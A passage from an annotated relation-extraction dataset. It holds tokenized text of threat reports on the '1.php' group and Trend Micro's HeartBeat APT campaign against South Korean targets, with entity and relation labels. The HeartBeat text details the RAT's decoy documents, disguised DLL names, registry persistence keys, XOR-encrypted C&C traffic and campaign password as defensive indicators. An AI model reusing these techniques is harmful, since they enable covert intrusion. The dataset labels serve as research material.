"popular", "among", "previously", "documented", "-Zscaler", "ThreatLabZ", "an", "attack", "performed", "over", "a", "significant", "period", "of", "time", "that", "focused", "on", "a", "specific", "target", ",", "given", "the", "sensitive", "nature", "of", "their", "work", "."], ["Based", "on", "information", "in", "the", "public", "domain", ",", "it", "appears", "that", "these", "attacks", "correlate", "with", "others", ",", "previously", "identified", "as", "being", "the", "work", "of", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["Identified", "targets", "of", "these", "attacks", "include", "China", "/", "US", "relations", "experts", ",", "USG", "/", "DIB", "entities", ",", "and", "the", "Geospatial", "industry", "."], ["Based", "on", "the", "targets", ",", "it", "is", "our", "belief", "that", "corporate", "espionage", "was", "the", "goal", "of", "the", "attacks", "."], ["Open", "-", "source", "reports", "suggest", "that", "these", "attacks", "are", "more", "widespread", "than", "many", "realize", "and", "that", "the", "same", "or", "similar", "actors", "are", "compromising", "numerous", "organizations", "in", "order", "to", "steal", "sensitive", "intellectual", "property", "."], ["As", "stated", "within", "the", "Lessons", "Learned", "section", ",", "it", "is", "important", "that", "those", "concerned", "about", "such", "attacks", "be", "vigilant", "in", "their", "log", "collection", "and", "analysis", "to", "identify", "anomalies", "or", "other", "indications", "of", "compromise", "."], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "17"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "About", "Zscaler", ":", "The", "Cloud", "Security", "Company", "\u2122"], ["Zscaler", "enforces", "business", "policy", ",", "mitigates", "risk", "and", "provides", "twice", "the", "functionality", "at", "a", "fraction", "of", "the", "cost", "of", "current", "solutions", ",", "utilizing", "a", "multi", "-", "tenant", ",", "globally", "-", "deployed", "infrastructure", "."], ["Zscaler", "\u2019s", "integrated", ",", "cloud", "-", "delivered", "security", "services", "include", "Web", "Security", ",", "Mobile", "Security", ",", "Email", "Security", "and", "DLP", "."], ["Zscaler", "services", "enable", "organizations", "to", "provide", "the", "right", "access", "to", "the", "right", "users", ",", "from", "any", "place", "and", "on", "any", "device", "\u2014", "all", "while", "empowering", "the", "end", "-", "user", "with", "a", "rich", "Internet", "experience", "."], ["About", "Zscaler", "ThreatLabZ", "\u2122", "ThreatLabZ", "is", "the", "global", "security", "research", "team", "for", "Zscaler", "."], ["Leveraging", "an", "aggregate", "view", "of", "billions", "of", "daily", "web", "transaction", ",", "from", "millions", "of", "users", "across", "the", "globe", ",", "ThreatLabZ", "identifies", "new", "and", "emerging", "threats", "as", "they", "occur", ",", "and", "deploys", "protections", "across", "the", "Zscaler", "Security", "Cloud", "in", "real", "time", "to", "protect", "customers", "from", "advanced", "threats", "."], ["For", "more", "information", ",", "visit", "www.zscaler.com", "."], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "18"]]}, {"vertexSet": [[{"name": "HeartBeat", "pos": [37, 38], "sent_id": 18, "type": "Campaign"}], [{"name": "2009", "pos": [53, 54], "sent_id": 18, "type": "Time"}], [{"name": "HeartBeat", "pos": [16, 17], "sent_id": 24, "type": "Campaign"}], [{"name": "remote administration tool", "pos": [15, 18], "sent_id": 25, "type": "Malware"}], [{"name": "Luckycat", "pos": [4, 5], "sent_id": 28, "type": "Campaign"}], [{"name": "aerospace, energy, engineering, shipping, and military research industries", "pos": [8, 20], "sent_id": 28, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [21, 22], "sent_id": 28, "type": "Country"}], [{"name": "Japan", "pos": [23, 24], "sent_id": 28, "type": "Country"}], [{"name": "Tibetan activists\u2019 community", "pos": [29, 33], "sent_id": 28, "type": "ExploitTargetObject"}], [{"name": "IXESHE", "pos": [1, 2], "sent_id": 29, "type": "Campaign"}], [{"name": "East Asian governments", "pos": [10, 13], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "Taiwanese electronics manufacturers", "pos": [14, 17], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "telecommunications company", "pos": [20, 22], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "Taidoor", "pos": [1, 2], "sent_id": 30, "type": "Campaign"}], [{"name": "Taiwan", "pos": [17, 18], "sent_id": 30, "type": "Country"}], [{"name": "South Korea", "pos": [15, 17], "sent_id": 31, "type": "Country"}], [{"name": "HeartBeat", "pos": [7, 8], "sent_id": 32, "type": "Campaign"}], [{"name": "HeartBeat", "pos": [19, 20], "sent_id": 33, "type": "Campaign"}], [{"name": "June 2012", "pos": [24, 26], "sent_id": 34, "type": "Time"}], [{"name": "November 2009", "pos": [11, 13], "sent_id": 36, "type": "Time"}], [{"name": "Political parties", "pos": [1, 3], "sent_id": 38, "type": "ExploitTargetObject"}], [{"name": "Media outfits", "pos": [4, 6], "sent_id": 38, "type": "ExploitTargetObject"}], [{"name": "A national policy research institute", "pos": [1, 6], "sent_id": 39, "type": "ExploitTargetObject"}], [{"name": "A military branch of South Korean armed forces", "pos": [0, 8], "sent_id": 40, "type": "ExploitTargetObject"}], [{"name": "HeartBeat", "pos": [12, 13], "sent_id": 40, "type": "Campaign"}], [{"name": "HeartBeat", "pos": [4, 5], "sent_id": 50, "type": "Campaign"}], [{"name": "spearphishing emails", "pos": [19, 21], "sent_id": 53, "type": "Email"}], [{"name": "Trend Micro", "pos": [6, 8], "sent_id": 71, "type": "Organization"}], [{"name": "Smart Protection Network", "pos": [9, 12], "sent_id": 71, "type": "Software"}], [{"name": "RAT", "pos": [16, 17], "sent_id": 87, "type": "Malware"}], [{"name": "%Program Files%\\Common Files\\Services\\6to4nt.dll", "pos": [10, 14], "sent_id": 89, "type": "File"}], [{"name": "%Program Files%\\Common Files\\System\\6to4nt.dll", "pos": [15, 19], "sent_id": 89, "type": "File"}], [{"name": "%Program Files%\\Windows NT\\Accessories\\6to4nt.dll", "pos": [20, 24], "sent_id": 89, "type": "File"}], [{"name": "%Program Files%\\Windows NT\\htrn.dll", "pos": [25, 29], "sent_id": 89, "type": "File"}], [{"name": "%Program Files%\\Windows NT\\htrn_jls.dll", "pos": [30, 34], "sent_id": 89, "type": "File"}], [{"name": "%Program Files%\\Windows NT\\hyper.dll", "pos": [35, 39], "sent_id": 89, "type": "File"}], [{"name": "%System%\\Network Remote.dll", "pos": [40, 43], "sent_id": 89, "type": "File"}], [{"name": "%System%\\SvcHost.dll", "pos": [44, 46], "sent_id": 89, "type": "File"}], [{"name": "RAT", "pos": [1, 2], "sent_id": 100, "type": "Malware"}], [{"name": "%System%\\msrt.exe", "pos": [21, 23], "sent_id": 100, "type": "File"}], [{"name": "%Program Files%\\Common Files\\AcroRd32.exe", "pos": [24, 28], "sent_id": 100, "type": "File"}], [{"name": "%Program Files%\\Common Files\\config.exe", "pos": [1, 5], "sent_id": 101, "type": "File"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name} Type = \u201c20\u201d Start = \u201c2\u201d ErrorControl = \u201c1\u201d ImagePath = \u201c%SystemRoot%\\System32\\svchost.exe -k netsvcs\u201d ObjectName = \u201cLocalSystem\u201d", "pos": [15, 47], "sent_id": 104, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Parameters ServiceDll = C:\\Program Files\\Windows NT\\htrn. dll", "pos": [47, 57], "sent_id": 104, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Security Security = {values}", "pos": [57, 65], "sent_id": 104, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Enum 0 = \u201cRoot\\LEGACY_{service name}\\0000\u201d Count = \u201c1\u201d NextInstance = \u201c1\u201d *{service name} may be \u201c6to4\u201d, \u201cIas\u201d or \u201cIrmon\u201d", "pos": [0, 37], "sent_id": 105, "type": "Indicator"}], [{"name": "qawsed", "pos": [13, 14], "sent_id": 108, "type": "Indicator"}], [{"name": "HeartBeat", "pos": [9, 10], "sent_id": 134, "type": "Malware"}], [{"name": "army-1022", "pos": [11, 12], "sent_id": 137, "type": "Indicator"}], [{"name": "HeartBeat", "pos": [3, 4], "sent_id": 138, "type": "Campaign"}], [{"name": "Armenia", "pos": [10, 11], "sent_id": 139, "type": "Country"}], [{"name": "USA", "pos": [12, 13], "sent_id": 139, "type": "Country"}], [{"name": "Japan", "pos": [14, 15], "sent_id": 139, "type": "Country"}], [{"name": "India", "pos": [16, 17], "sent_id": 139, "type": "Country"}], [{"name": "Korea", "pos": [18, 19], "sent_id": 139, "type": "Country"}]], "labels": [{"r": "P33", "h": 0, "t": 1, "evidence": [18]}, {"r": "P22", "h": 2, "t": 3, "evidence": [24, 25]}, {"r": "P32", "h": 4, "t": 6, "evidence": [28]}, {"r": "P32", "h": 4, "t": 7, "evidence": [28]}, {"r": "P27", "h": 4, "t": 8, "evidence": [28]}, {"r": "P27", "h": 4, "t": 5, "evidence": [28]}, {"r": "P27", "h": 9, "t": 10, "evidence": [29]}, {"r": "P27", "h": 9, "t": 11, "evidence": [29]}, {"r": "P27", "h": 9, "t": 12, "evidence": [29]}, {"r": "P32", "h": 13, "t": 14, "evidence": [30]}, {"r": "P32", "h": 16, "t": 15, "evidence": [31, 32]}, {"r": "P33", "h": 17, "t": 18, "evidence": [33, 34]}, {"r": "P33", "h": 17, "t": 19, "evidence": [33, 36]}, {"r": "P27", "h": 24, "t": 20, "evidence": [38, 40]}, {"r": "P27", "h": 24, "t": 21, "evidence": [38, 40]}, {"r": "P27", "h": 24, "t": 22, "evidence": [39, 40]}, {"r": "P27", "h": 24, "t": 23, "evidence": [40]}, {"r": "P17", "h": 27, "t": 28, "evidence": [71]}, {"r": "P21", "h": 30, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 31, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 32, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 33, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 34, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 35, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 36, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 37, "t": 29, "evidence": [87, 89]}, {"r": "P21", "h": 39, "t": 38, "evidence": [100]}, {"r": "P21", "h": 40, "t": 38, "evidence": [100]}, {"r": "P21", "h": 41, "t": 38, "evidence": [100, 101]}, {"r": "P21", "h": 48, "t": 47, "evidence": [134, 137]}, {"r": "P32", "h": 49, "t": 50, "evidence": [138, 139]}, {"r": "P32", "h": 49, "t": 51, "evidence": [138, 139]}, {"r": "P32", "h": 49, "t": 54, "evidence": [138, 139]}, {"r": "P32", "h": 49, "t": 52, "evidence": [138, 139]}, {"r": "P32", "h": 49, "t": 53, "evidence": [138, 139]}], "title": "201201TrendMicroHeartBeat", "sents": [["Trend", "Micro", "Incorporated", "Research", "Paper", "2012", "The", "HeartBeat", "APT"], ["Campaign", "Roland", "Dela", "Paz", "Contents"], ["About", "This", "Paper"], ["...................................................................................................................................", "1"], ["Introduction", "............................................................................................................................................", "1", "Campaign", "Targets", "................................................................................................................................."], ["2", "Context", "....................................................................................................................................................", "2", "Attack", "Vector", "........................................................................................................................................."], ["3", "Infection", "Flow", "........................................................................................................................................"], ["4"], ["The", "RAT", "Component", "............................................................................................................................", "5"], ["Backdoor", "Functionalities", "............................................................................................................."], ["5", "Installation", "and", "Persistence", "........................................................................................................", "5"], ["C&C", "Communication", "....................................................................................................................."], ["6", "Command", "and", "Control", "........................................................................................................................."], ["8", "HeartBeat", "Campaign", "Codes", "and", "Decoy", "Documents", "....................................................................", "8", "Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns", "..........................................................."], ["9"], ["Attribution", ".............................................................................................................................................", "10"], ["Conclusion", ".............................................................................................................................................", "10"], ["Timeline", "..................................................................................................................................................", "10"], ["Defending", "against", "the", "HeartBeat", "Campaign", ".................................................................................", "11", "Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components", ".................", "12", "PAGE", "ii", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "About", "This", "Paper", "Introduction", "This", "paper", "exposes", "a", "targeted", "attack", "called", "\u201c", "HeartBeat", ",", "\u201d", "which", "has", "been", "persistently", "pursuing", "the", "South", "Korean", "government", "and", "related", "organizations", "since", "2009", "."], ["This", "paper", "will", "discuss", "how", "their", "specifically", "crafted", "campaigns", "infiltrate", "their", "targets", "."], ["Today", "\u2019s", "cybercriminals", "try", "to", "infect", "as", "many", "users", "as", "possible", "."], ["Their", "goal", "is", "simple", "\u2014", "to", "monetize", "the", "resources", "or", "data", "from", "infected", "machines", "in", "any", "way", "they", "can", "."], ["Behind"], ["such", "attacks", "are", "highly", "covert", "targeted", "campaigns", "known", "as", "APTs", "."], ["Compared", "to", "most", "advanced", "persistent", "threat", "(", "APT", ")", "campaigns", "with", "diverse", "targeted", "industries", ",", "the", "HeartBeat", "campaign", "is", "an", "isolated", "case", "."], ["Furthermore", ",", "we", "will", "examine", "their", "attack", "methodologies", "which", "include", "their", "attack", "vector", ",", "the", "remote", "administration", "tool", "(", "RAT", ")", "component", ",", "and", "command", "-", "and", "-", "control", "servers", "."], ["Finally", ",", "we", "will", "discuss", "how", "this", "information", "can", "be", "useful", "in", "developing", "defensive", "strategies", "in", "protecting", "organizations", "as", "well", "as", "predicting", "future", "targets", "."], ["While", "targeted", "campaigns", "continue", "to", "increase", ",", "research", "efforts", "by", "the", "security", "industry", "reveal", "that", "some", "of", "these", "attacks", "have", "existed", "for", "several", "years.1", "Depending", "on", "the", "motive", ",", "APT", "campaigns", "may", "attack", "various", "industries", ",", "organizations", "or", "communities", "from", "different", "regions", "and", "countries", "."], ["For", "instance", ",", "the", "Luckycat", "campaign", "targeted", "the", "aerospace", ",", "energy", ",", "engineering", ",", "shipping", ",", "and", "military", "research", "industries", "in", "India", "and", "Japan.2", "Additionally", ",", "they", "targeted", "the", "Tibetan", "activists", "\u2019", "community", "."], ["The", "IXESHE", "campaign", ",", "on", "the", "other", "hand", ",", "targeted", "East", "Asian", "governments", ",", "Taiwanese", "electronics", "manufacturers", ",", "and", "a", "telecommunications", "company.3", "While", "most", "of", "these", "campaigns", "have", "multiple", "targets", ",", "smaller", ",", "more", "subtle", "campaigns", "with", "exceedingly", "specific", "targets", "are", "also", "present", "."], ["The", "Taidoor", "campaign", "is", "an", "example", "of", "this", ",", "where", "all", "of", "the", "compromise", "victims", "were", "from", "Taiwan", ",", "and", "the", "majority", "of", "which", "were", "government", "organizations.4"], ["This", "research", "paper", "will", "delve", "into", "a", "targeted", "campaign", "that", "targets", "organizations", "and", "communities", "within", "South", "Korea", "."], ["We", "call", "this", "malicious", "operation", "the", "\u201c", "HeartBeat", "campaign", ".", "\u201d"], ["1", "http://www.trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_dissecting-lurid-apt.pdf", "2", "http://www.trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_luckycat_redux.pdf", "3", "http://www.trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_ixeshe.pdf", "4", "http://www.trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_the_taidoor_campaign.pdf", "PAGE", "1", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "Campaign", "Targets", "Context", "The", "HeartBeat", "campaign", "appears", "to", "target", "government", "organizations", "and", "institutions", "or", "communities", "that", "are", "in", "some", "way", "related", "to", "the", "South", "Korean", "government", "."], ["Specifically", ",", "we", "were", "able", "to", "identify", "the", "following", "targets", ":", "The", "first", "HeartBeat", "campaign", "remote", "access", "tool", "(", "RAT)5", "component", "was", "discovered", "in", "June", "2012", "in", "a", "Korean", "newspaper", "company", "network", "."], ["Further", "investigation", "revealed", "that", "the", "campaign", "has", "been", "actively", "distributing", "their", "RAT", "component", "to", "their", "targets", "in", "2011", "and", "the", "first", "half", "of", "2012", "."], ["Furthermore", ",", "we", "uncovered", "one", "malware", "component", "that", "dates", "back", "to", "November", "2009", "."], ["This", "indicates", "that", "the", "campaign", "started", "during", "that", "time", "or", "earlier", "."], ["\u2022", "Political", "parties", "\u2022", "Media", "outfits"], ["\u2022", "A", "national", "policy", "research", "institute", "\u2022"], ["A", "military", "branch", "of", "South", "Korean", "armed", "forces", "Earlier", "versions", "of", "the", "HeartBeat", "campaign", "\u2019s", "RAT", "component", "contained", "the", "following", "strings", "in", "their", "codes", ":", "\u2022", "A", "small", "business", "sector", "organization"], ["Thus", ",", "the", "campaign", "name", "\u201c", "HeartBeat", ".", "\u201d", "\u2022", "Branches", "of", "South", "Korean", "government"], ["The", "profile", "of", "their", "targets", "suggests", "that", "the", "motive", "behind", "the", "campaign", "may", "be", "politically", "motivated", "."], ["Figure", "1", "."], ["Code", "used", "in", "the", "HeartBeat", "campaign", "\u2019s", "RAT", "component", "5", "http://en.wikipedia.org/wiki/Remote_administration_software", "PAGE", "2", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "Attack", "Vector"], ["In", "order", "to", "gain", "control", "over", "targets", "systems", ",", "HeartBeat", "perpetrators", "install", "a", "RAT", "in", "prospective", "victims", "\u2019", "systems", "."], ["This", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which", "is", "actually", "a", "bundled", "file", "."], ["The", "bundled", "file", "contains", "both", "a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been", "packaged", "together", "using", "a", "binder", "tool", "."], ["Once", "it", "runs", ",", "the", "decoy", "document", "is", "displayed", "to", "the", "user", "while", "the", "RAT", "unknowingly", "executes", "in", "the", "background", "."], ["Based", "on", "the", "samples", "we", "collected", ",", "the", "campaign", "\u2019s", "decoy", "documents", "used", "the", "file", "formats", ".JPG", ",", ".PDF", ",", "XLS", ",", "and", "HWP", ",", "the", "Korean", "government", "standard", "word", "processor", "format", "."], ["One", "of", "the", "previous", "HeartBeat", "attacks", "even", "dropped", "a", "pornographic", ".JPG", "image", "as", "decoy", "."], ["Below", "is", "a", "screenshot", "of", "a", "Hangul", "Word", "Processor", "(", ".HWP", ")", "document", "used", "as", "bait", "in", "November", "2011", "."], ["Its", "document", "title", "roughly", "translates", "to", "\u201c", "Information", "to", "the", "President.hwp", ".", "\u201d"], ["It", "is", "unclear", "how", "these", "packaged", "files", "specifically", "arrive", "on", "victims", "\u2019", "systems", ",", "but", "we", "highly", "suspect", "that", "spearphishing", "emails6", "containing", "these", "packaged", "malware", "were", "primarily", "used", "to", "distribute", "them", "."], ["In", "fact", ",", "the", "packaged", "malware", "used", "the", "icon", "of", "the", "decoy", "document", "in", "order", "to", "look", "legitimate", "."], ["For", "instance", ",", "if", "the", "decoy", "is", "an", "XLS", "file", ",", "the", "package", "will", "appear", "to", "have", "an", "XLS", "document", "icon", "."], ["In", "addition", ",", "some", "of", "the", "decoy", "files", "required", "passwords", "in", "order", "to", "be", "viewed", "."], ["Figure", "3", "."], ["A", "decoy", ".HWP", "document", "Figure", "2", "."], ["Example", "of", "a", "decoy", "Adobe", "Reader", "document", "The", "previously", "mentioned", "techniques", "are", "commonly", "used", "in", "spearphishing", "attacks", "where", "prospective", "victims", "are", "lured", "to", "open", "a", "seemingly", "benign", "document", "attachment", "."], ["In", "order", "to", "appear", "more", "legitimate", ",", "some", "of", "these", "emails", "contain", "password", "protected", "documents", "."], ["A", "password", "is", "then", "provided", "in", "the", "email", "body", "as", "a", "social", "engineering", "technique", "."], ["6", "http://blog.trendmicro.com/taiwan-spear-phishers-target-gmail-users/"], ["PAGE", "3", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "Infection", "Flow"], ["Once", "users", "open", "the", "packaged", "malicious", "file", ",", "the", "actual", "document", "is", "displayed", "to", "the", "user", "while", "a", "RAT", "installer", "in", ".EXE", "format", "runs", "in", "the", "background", "."], ["The", "RAT", "installer", ",", "on", "the", "other", "hand", ",", "drops", "a", ".DLL", "file", "that", "is", "then", "injected", "to", "the", "legitimate", "process", "svchost.exe", "."], ["The", "injected", "code", "in", "svchost.exe", "then", "connects", "to", "the", "malware", "command", "and", "control", "(", "C&C", ")", "server", "to", "register", "infection", "and", "wait", "for", "remote", "commands", "."], ["Figure", "4", "."], ["Infection", "diagram", "for", "the", "HeartBeat", "campaign", "TREND", "MICRO", "INCORPORATED", "TREND", "MICRO", "INC"], [".", "Trend", "Micro", "Incorporated", "(", "TYO", ":", "4704", ";", "TSE", ":", "4704", ")", ",", "a", "global", "cloud", "security", "leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses", "and", "consumers", "."], ["A", "pioneer", "in", "server", "security", "with", "over", "20", "years", "\u2019", "experience", ",", "we", "deliver", "top", "-", "ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers", "\u2019", "and", "partners", "\u2019", "needs", ",", "stops", "new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud", "environments", "."], ["Powered", "by", "the", "industry", "-", "leading", "Trend", "Micro", "\u2122", "Smart", "Protection", "Network", "\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products", "and", "services", "stop", "threats", "where", "they", "emerge", "\u2014", "from", "the", "Internet", "."], ["They", "are", "supported", "by", "1,000", "+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N.", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U.S.", "toll", "free", ":", "1", "+800.228.5651", "Phone", ":", "1", "+408.257.1500"], ["Fax", ":", "1", "+408.257.2003", "www.trendmicro.com", "\u00a9", "2012", "by", "Trend", "Micro", ",", "Incorporated", "."], ["All", "rights", "reserved", "."], ["Trend", "Micro", "and", "the", "Trend", "Micro", "t", "-", "ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", "."], ["All", "other", "product", "or", "company", "names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "4", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "RAT", "Component", "Backdoor", "Functionalities"], ["The", "HeartBeat", "campaign", "\u2019s", "RAT", "component", "allows", "attackers", "to", "remotely", "execute", "the", "following", "commands", "on", "affected", "hosts", ":"], ["\u2022", "List", "running", "processes", "and", "their", "respective", "process", "IDs", "\u2022", "Download", "and", "execute", "file(s", ")"], ["\u2022"], ["Update", "itself", "\u2022"], ["Uninstall", "itself", "\u2022", "Create", "or", "terminate", "a", "process", "\u2022", "List", "available", "removable", "and", "fixed", "drives", "The", "RAT", "installer", "in", "turn", "drops", "a", ".DLL", "component", "which", "contains", "the", "backdoor", "capabilities", "."], ["In", "order", "to", "stay", "hidden", ",", "the", ".DLL", "uses", "file", "names", "similar", "to", "legitimate", "applications", "."], ["Below", "is", "a", "list", "of", "file", "names", "used", ":", "\u2022", "%", "Program", "Files%\\Common", "Files\\Services\\6to4nt.dll", "\u2022", "%", "Program", "Files%\\Common", "Files\\System\\6to4nt.dll", "\u2022", "%", "Program", "Files%\\Windows", "NT\\Accessories\\6to4nt.dll", "\u2022", "%", "Program", "Files%\\Windows", "NT\\htrn.dll", "\u2022", "%", "Program", "Files%\\Windows", "NT\\htrn_jls.dll", "\u2022", "%", "Program", "Files%\\Windows", "NT\\hyper.dll", "\u2022", "%", "System%\\Network", "Remote.dll", "\u2022", "%", "System%\\SvcHost.dll"], ["Some", "these", "dropped", ".DLL", "files", "use", "fake", "file", "properties", "in", "order", "to", "not", "appear", "suspicious", "."], ["The", "following", "is", "an", "example", ":", "\u2022", "List", "existing", "files", "and", "their", "creation", "date", "/", "time", "\u2022", "Upload", "file(s", ")"], ["\u2022", "Delete", "file(s", ")"], ["\u2022", "Get", "the", "file", "creation", "date", "/", "time", "of", "a", "specific", "file"], ["\u2022", "Open", "a", "remote", "command", "shell", "access"], ["\u2022"], ["Reboot", "the", "system"], ["These", "commands", "give", "the", "attackers", "complete", "control", "over", "their", "victims", "\u2019", "systems", "."], ["Attackers", "also", "have", "the", "option", "to", "uninstall", "the", "RAT", "any", "time", "to", "cover", "their", "tracks", "and", "avoid", "being", "discovered", "."], ["Installation", "and", "Persistence"], ["The", "RAT", "installer", "is", "initially", "dropped", "and", "executed", "by", "the", "packaged", "file", "using", "any", "of", "the", "following", "file", "names", ":", "\u2022", "%", "System%\\msrt.exe", "\u2022", "%", "Program", "Files%\\Common", "Files\\AcroRd32.exe"], ["\u2022", "%", "Program", "Files%\\Common", "Files\\config.exe", "Figure", "5", "."], ["A.DLL", "that", "uses", "fake", "file", "properties", "\u2022", "%", "Program", "Files%\\Common", "Files\\explorer.exe", "PAGE", "5", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["In", "some", "cases", ",", "the", "RAT", "installer", "drops", "2", ".DLL", "files", "where", "one", "of", "the", ".DLLs", "serves", "as", "a", "loader", "of", "the", "other", ".DLL", "file", "which", "contains", "the", "backdoor", "payload", "."], ["The", ".DLL", "component", "is", "then", "registered", "as", "a", "service", "through", "the", "following", "added", "registries", ":", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\", "Services\\{service", "name", "}", "Type", "=", "\u201c", "20", "\u201d", "Start", "=", "\u201c", "2", "\u201d", "ErrorControl", "=", "\u201c", "1", "\u201d", "ImagePath", "=", "\u201c", "%", "SystemRoot%\\System32\\svchost.exe", "-k", "netsvcs", "\u201d", "ObjectName", "=", "\u201c", "LocalSystem", "\u201d", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\", "Services\\{service", "name}\\Parameters", "ServiceDll", "=", "C:\\Program", "Files\\Windows", "NT\\htrn", ".", "dll", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\", "Services\\{service", "name}\\Security", "Security", "=", "{", "values", "}"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\", "Services\\{service", "name}\\Enum", "0", "=", "\u201c", "Root\\LEGACY_{service", "name}\\0000", "\u201d", "Count", "=", "\u201c", "1", "\u201d", "NextInstance", "=", "\u201c", "1", "\u201d", "*", "{", "service", "name", "}", "may", "be", "\u201c", "6to4", "\u201d", ",", "\u201c", "Ias", "\u201d", "or", "\u201c", "Irmon", "\u201d", "."], ["C&C", "Communication"], ["Once", "the", "RAT", "\u2019s", ".DLL", "component", "has", "been", "injected", "to", "svchost.exe", ",", "the", "malware", "attempts", "to", "register", "itself", "to", "the", "C&C", "server", "by", "sending", "the", "following", "information", "from", "the", "affected", "system", ":", "\u2022", "Computer", "name", "\u2022", "Local", "IP", "address", "\u2022", "Service", "pack"], ["These", "data", "are", "sent", "along", "with", "a", "campaign", "code", "and", "the", "string", "\u201c", "qawsed", "\u201d", "."], ["While", "the", "\u201c", "qawsed", "\u201d", "string", "is", "not", "present", "in", "earlier", "versions", "of", "their", "RAT", ",", "we", "suspect", "that", "the", "attackers", "only", "recently", "added", "this", "as", "a", "default", "campaign", "password", "."], ["The", "RAT", "\u2019s", "C&C", "communication", "is", "encrypted", "with", "XOR", "encryption", "using", "a", "single", "byte", "key", ",", "02H."], ["Furthermore", ",", "the", "data", "being", "transferred", "and", "received", "by", "the", "RAT", "C&C", "are", "800H", "(", "2,048", "bytes", ")", "in", "size", "."], ["The", "service", "is", "then", "invoked", "once", "installed", "."], ["This", "results", "in", "the", ".DLL", "being", "injected", "to", "svchost.exe", "process", "."], ["This", "registry", "modification", "allows", "the", "RAT", "to", "execute", "upon", "every", "system", "startup", "."], ["After", "installation", "the", "RAT", "installer", "deletes", "itself", ",", "which", "leaves", "only", "the", "disguised", ".DLL", "and", "related", "registry", "entries", "on", "the", "affected", "system", "."], ["Note", "that", "the", "presence", "of", "any", "of", "the", "files", "or", "registries", "above", "may", "be", "an", "indication", "of", "a", "possible", "HeartBeat", "infection", "in", "a", "system", "."], ["Figure", "6", "."], ["RAT", "\u2019s", "encryption", "algorithm", "before", "sending", "data", "to", "its", "C&C", "server", "PAGE", "6", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "Figure", "7", "."], ["RAT", "\u2019s", "decryption", "code", "upon", "receiving", "data", "from", "the", "C&C", "server", "During", "the", "RAT", "\u2019s", "phone", "home", ",", "the", "following", "TCP", "traffic", "is", "observed", "on", "the", "network", ":", "When", "decrypted", ",", "the", "above", "traffic", "looks", "as", "follows", ":", "The", "majority", "of", "the", "RAT", "variants", "used", "port", "80", "."], ["Recent", "variants", ",", "however", ",", "were", "observed", "to", "use", "port", "443", "."], ["Other", "ports", "we", "have", "seen", "being", "utilized", "are", "port", "5600", "and", "port", "8080", "."], ["Earlier", "RAT", "variants", "did", "not", "use", "encryption", "on", "their", "C&C", "communication", "."], ["Moreover", ",", "they", "only", "sent", "the", "computer", "name", "and", "campaign", "code", "during", "phone", "home", "."], ["Below", "is", "a", "screenshot", "of", "the", "unencrypted", "C&C", "communication", "."], ["PAGE", "7", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "C&C", "traffic", "size", "also", "varied", "in", "previous", "versions", "."], ["Some", "early", "variants", "used", "traffic", "that", "are", "28H", "(", "40", "bytes", ")", "and", "1004H", "(", "4,100", "bytes", ")", "in", "size", "."], ["Additionally", ",", "the", "port", ",", "C&C", "address", ",", "campaign", "code", "and", "password", "are", "hardcoded", "in", "the", "RAT", "\u2019s", "malware", "body", "in", "plain", "text", "."], ["In", "some", "RAT", "versions", ",", "however", ",", "they", "are", "encrypted", "and", "are", "decrypted", "only", "during", "run", "-", "time", ",", "possibly", "to", "protect", "the", "RAT", "from", "static", "analysis", "by", "security", 